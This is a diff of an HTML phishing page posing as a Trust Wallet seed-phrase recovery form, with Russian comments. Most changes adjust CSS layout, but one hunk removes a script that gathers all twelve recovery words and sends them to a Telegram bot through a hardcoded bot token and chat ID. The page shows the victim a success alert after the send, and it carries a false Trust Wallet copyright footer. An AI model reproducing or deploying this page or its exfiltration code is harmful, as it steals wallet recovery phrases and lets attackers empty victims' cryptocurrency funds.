@@ -49,6 +49,7 @@
             display: grid;
             grid-template-columns: 1fr 1fr; /* Два равных столбца */
             gap: 16px;
+            justify-content: center; /* Центрирование всей сетки */
             margin-bottom: 20px;
         }
         .seed-item {
@@ -60,8 +61,8 @@
             font-size: 14px;
             color: #A0A0A0;
             font-weight: bold;
-            width: 20px; /* Фиксированная ширина для выравнивания */
-            text-align: right;
+            width: 25px; /* Фиксированная ширина для выравнивания */
+            text-align: center;
         }
         input {
             padding: 8px;
@@ -82,7 +83,8 @@
         }
         button {
             margin-top: 20px;
-            width: 100%;
+            width: 100%; /* Полная ширина кнопки */
+            max-width: 200px; /* Ограничение максимальной ширины */
             padding: 14px;
             background-color: #122fe6;
             color: #FFFFFF;
@@ -92,6 +94,7 @@
             border-radius: 18px;
             cursor: pointer;
             transition: background-color 0.3s;
+            align-self: center; /* Центрирование кнопки */
         }
         button:hover {
             background-color: #1C86EE;
@@ -175,39 +178,6 @@
         </form>
         <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
     </div>
-
-    <script>
-        document.getElementById('seedForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-
-            const words = [];
-            for (let i = 1; i <= 12; i++) {
-                words.push(document.getElementById(`word${i}`).value.trim());
-            }
-
-            if (words.length === 12 && words.every(word => word)) {
-                const message = words.map((word, index) => `${index + 1}. ${word}`).join('\n');
-                const chatId = '@bdsjxjdhd'; // Укажите ваш chat_id
-                const token = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg'; // Укажите ваш токен
-                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-                fetch(url)
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.ok) {
-                            alert('Секретная фраза успешно отправлена!');
-                        } else {
-                            alert('Ошибка отправки: ' + data.description);
-                        }
-                    })
-                    .catch(error => {
-                        alert('Ошибка отправки: ' + error.message);
-                    });
-            } else {
-                alert('Пожалуйста, заполните все поля.');
-            }
-        });
-    </script>
 
     <footer>
         © 2025 Trust Wallet. Все права защищены.
